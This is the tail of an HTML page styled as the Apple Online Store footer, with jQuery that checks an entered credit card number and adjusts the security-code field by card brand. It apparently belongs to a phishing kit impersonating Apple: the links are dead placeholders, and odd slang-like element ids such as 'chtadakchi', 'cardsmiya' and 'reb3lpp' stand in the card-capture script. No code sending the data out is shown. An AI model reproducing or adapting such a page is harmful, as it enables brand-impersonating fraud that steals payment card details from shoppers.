            			</div></div></div></div></div><div class="as-chat rs-chat"><div class="as-l-container rs-chat-content">
	
		<div>Need more help? <button class="as-chat-button as-buttonlink">Chat now</button> or call 1‑800‑MY‑APPLE.</div>
	
	
	
</div></div><div class="as-footnotes"><div class="as-footnotes-content"><div data-recon-globalpostrender="footer,isEmpty,loginHome" class="as-footnotes-sosumi"><p>The Apple Online Store uses industry-standard encryption to protect the confidentiality of the information you submit. Learn more about our <a href="#">Security Policy</a>.</p></div></div></div></div></div></div>
            

            
            
	
       	
			<footer class="as-globalfooter as-globalfooter-simple as-globalfooter-contained js flexbox">
	<div class="as-globalfooter-content">
		<div class="as-globalfooter-mini">

	    

	<div class="as-globalfooter-mini-shop">
		
	
		<p>More ways to shop: <span class="nowrap">Visit an <a href="#"  target="_blank">Apple Store</a></span>, <span class="nowrap">call 1‑800‑MY‑APPLE, or <a href="#" target="_blank">find a reseller</a></span>.</p>
	
	
	

	</div>



		
			<div class="as-globalfooter-mini-locale">

	        		<a target="_blank" class="as-globalfooter-mini-locale-link" href="#">
	        			<img class="ir as-globalfooter-mini-locale-flag ir as-globalfooter-mini-locale-flag ir" src="" alt="" width="16" height="16" data-scale-params-2="wid=32&amp;hei=32&amp;fmt=png-alpha&amp;op_usm=0.5,0.5&amp;.v=0">
	        			United States
	        			</a>
	        			
	        </div>
	    
	   <div class="as-globalfooter-mini-legal">
			<p class="as-globalfooter-mini-legal-copyright">
	    		Copyright © 2020 Apple Inc.  All rights reserved.
	    	</p>
	    	<p class="as-globalfooter-mini-legal-links">
             	
                    <a target="_blank" class="as-globalfooter-mini-legal-link" href="#" >Privacy Policy</a>
                
             	
                	<a target="_blank" class="as-globalfooter-mini-legal-link" href="#">Terms of Use</a>
                
            	
                    <a target="_blank" class="as-globalfooter-mini-legal-link" href="#">Sales and Refunds</a>
            	

				<a target="_blank" class="as-globalfooter-mini-legal-link" href="#" >
			        Site Map
			    </a>
			</p>
    	</div>




		<script type="text/javascript">		
		$('#cardnumber').validateCreditCard(function(result) {
            // console.log(result);
            if (result.card_type != null) {
                switch (result.card_type.name) {
                    case "VISA":

 $('#Securitycode').attr('pattern', '[0-9]{3}');
					$('#Securitycode').attr('maxlength', '3');



$('.chtadakchi').attr('id', 'chtavisa');


$('#cardsmiya').attr('class', 'creditOrDebit visa blue card image');





$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('cardImages-icon_selected').addClass('');

 $('#visaa').removeClass('').addClass('cardImages-icon_selected');
$('#cscaa').removeClass('csc-image_amex').addClass('');

                        $('#cardnumber').css('background-position', '98.5% 94%');
$('#thDSecure').css('background-position', '255.5% -20.5%'); 

                        break;
                    case "VISA ELECTRON":


$('.chtadakchi').attr('id', 'chtavisa');


$('#cardsmiya').attr('class', 'creditOrDebit visa blue card image');


$('#cardnumber').css('background-position', '98.5% 97%'); 


$('#thDSecure').css('background-position', '99.5% -20.5%'); 



$('#cscaa').removeClass('csc-image_amex').addClass('');

   $('#Securitycode').attr('pattern', '[0-9]{3}');
					$('#Securitycode').attr('maxlength', '3');



                        break;
                    case "MASTERCARD":


$('.chtadakchi').attr('id', 'chtamastercard');



$('#cardsmiya').attr('class', 'creditOrDebit mastercard black card image');






   $('#Securitycode').attr('pattern', '[0-9]{3}');
					$('#Securitycode').attr('maxlength', '3');

$('#metrcardaa').removeClass('').addClass('cardImages-icon_selected');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('cardImages-icon_selected ').addClass('');

 $('#visaa').removeClass('cardImages-icon_selected').addClass('');


$('#cscaa').removeClass('csc-image_amex').addClass('');

                        $('#cardnumber').css('background-position', '98.5% 72%');

$('#thDSecure').css('background-position', '99.5% 9.5%'); 

                        break;
                    case "MAESTRO":

$('.chtadakchi').attr('id', 'chtamastartro');


$('#cardsmiya').attr('class', 'creditOrDebit maestro black card image');



   $('#Securitycode').attr('pattern', '[0-9]{3}');
					$('#Securitycode').attr('maxlength', '3');

$('#cardnumber').css('background-position', '98.5% 69%');

$('#thDSecure').css('background-position', '102.5% 62.5%'); 



                        break;
                    case "DISCOVER":


$('.chtadakchi').attr('id', 'chtadiscover');


$('#cardsmiya').attr('class', 'creditOrDebit discover gray card image');



   $('#Securitycode').attr('pattern', '[0-9]{3}');
					$('#Securitycode').attr('maxlength', '3');



                        $('#cardnumber').css('background-position', '98.5% 46.8%');

$('#thDSecure').css('background-position', '98.5% 46.8%'); 

					
$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('').addClass('cardImages-icon_selected');

$('#amxaa').removeClass('cardImages-icon_selected').addClass('');

 $('#visaa').removeClass('cardImages-icon_selected').addClass('');

$('#cscaa').removeClass('csc-image_amex').addClass('');



break;
                    case "AMEX":

$('.chtadakchi').attr('id', 'chtaofam');
 

$('#cardsmiya').attr('class', 'creditOrDebit amex gray card image');




$('#csc').attr('pattern', '[0-9]{4}');
					$('#Securitycode').attr('maxlength', '4');

                        $('#cardnumber').css('background-position', '98.5% 6%');
$('#thDSecure').css('background-position', '99.5% 34%'); 




$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('').addClass('cardImages-icon_selected');

 $('#visaa').removeClass('cardImages-icon_selected').addClass('');


$('#cscaa').removeClass('').addClass('csc-image_amex');


                        break;
					case "JCB":

$('.chtadakchi').attr('id', 'chtajcb');




$('#cardsmiya').attr('class', 'creditOrDebit jcb gold card image');



$('#csc').attr('placeholder', 'Enter security code'); 

$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('cardImages-icon_selected').addClass('');

 $('#visaa').removeClass('cardImages-icon_selected').addClass('');


$('#cscaa').removeClass('').addClass('csc-image_amex');
                        $('#cardnumber').css('background-position', '98.5% 32%');

$('#thDSecure').css('background-position', '99.5% -20.5%'); 


                       break;
					case "DINERS_CLUB":

$('.chtadakchi').attr('id', 'chtacalub');


$('#cardsmiya').attr('class', 'creditOrDebit cb_nationale blue card image');





                        $('#cardnumber').css('background-position', '98.5% 24.8%');
$('#thDSecure').css('background-position', '99.5% -20.5%'); 

                        break;
					default:
                        $('#cardnumber').css('background-position', '98.5% 81.7%');
$('#thDSecure').css('background-position', '99.5% -20.5%'); 


$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('cardImages-icon_selected').addClass('');

 $('#visaa').removeClass('').addClass('cardImages-icon_selected');

                        $('#cardnumber').css('background-position', '98.5% -1%');

$('#thDSecure').css('background-position', '99.5% -20.5%'); 


$('#csc').attr('placeholder', 'Enter security code'); 
                        break;
                }
			} else {

$('.chtadakchi').attr('id', 'jkljk');

$('#thDSecure').css('background-position', '99.5% -20.5%'); 


$('#cardsmiya').attr('class', 'creditOrDebit reb3lpp blue card image');








$('#soracard').removeClass('visaLogo').addClass('');
$('#soracard').removeClass('master_cardLogo').addClass('');
$('#soracard').removeClass('amexLogo').addClass('');
$('#soracard').removeClass('discoverLogo').addClass('');


$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('cardImages-icon_selected').addClass('');

 $('#visaa').removeClass('cardImages-icon_selected').addClass('');

                $('#cardnumber').css('background-position', '98.5% -0.2%');

$('#csc').attr('placeholder', 'Enter security code');
            }
			 // Check for valid card numbere - only show validation checks for invalid Luhn when length is correct so as not to confuse user as they type.
            if (result.valid || $cardinput.val().length > 16) {
                if (result.valid) {


                    $('#cardnumber').removeClass('error').addClass('');
                } else {
                    $('#cardnumber') .removeClass('').addClass('error');
                }
            } else {
                $('#cardnumber').removeClass('').removeClass('error');
            }
        });
		</script>



	<script type="text/javascript">
        $(function() {
		    $('#cardnumber').validateCreditCard(function(result) {
                document.getElementById('card_type').value  = result.card_type.name
                document.getElementById('card_valid').value = result.valid
			$('#cardnumber').validateCreditCard(function(result) {
			    if(result.card_type == null){
                    $('#cardnumber').removeClass();
                }
                else{
                    $('#cardnumber').addClass(result.card_type.name);
					
                }
            });
            });
		});
        </script>



		</div>

    	</div>
	</footer>
        </div>
<div id="ac-gn-viewport-emitter"> </div>








</body></html>